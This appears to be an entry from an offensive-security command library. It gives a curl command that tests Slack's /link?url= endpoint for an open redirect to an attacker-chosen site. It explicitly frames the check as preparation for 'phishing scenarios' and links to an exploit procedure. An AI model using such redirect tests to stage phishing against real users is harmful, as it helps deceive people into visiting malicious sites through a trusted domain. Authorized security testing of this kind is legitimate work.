---
data: 'curl -L -I "https://[workspace].slack.com/link?url=http://malicious-site.com"'
tags:
  - testing
  - redirect
type: command
output: |-
  HTTP/2 302 
  location: http://malicious-site.com
  ...
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:27.292Z'
id: 3916880f-e173-4d35-b4af-41cb27b5f24e
verified: false
validated: true
submitted: true
---
# curl-test-slack-redirect

## Command

```bash
curl -L -I "https://[workspace].slack.com/link?url=http://malicious-site.com"
```

## Description

This command tests an open redirect vulnerability in Slack by sending a request to the crafted /link?url= endpoint and following the redirect to verify it points to the specified external URL. Use it to confirm the vulnerability before deploying in phishing scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-L` | Follow redirects | Yes |
| `-I` | Show response headers only | Yes |
| URL | Full Slack workspace URL with malicious redirect target | Yes |

## Examples

### Basic Usage

```bash
curl -L -I "https://sehacure.slack.com/link?url=http://www.likelo.com"
```

### Advanced Usage

```bash
curl -L -I -v "https://[workspace].slack.com/link?url=http://malicious-site.com" > redirect_test.txt
```

Add -v for verbose output to see the full request/response.

## Expected Output

A 302 Found status with a Location header matching the external URL, e.g.,

HTTP/2 302 
location: http://www.likelo.com
server: slack
...

If no redirect occurs, the vulnerability may be patched.

## Related

- [[Related Procedure|procedures/Exploit-Slack-Open-Redirect-Vulnerability]]
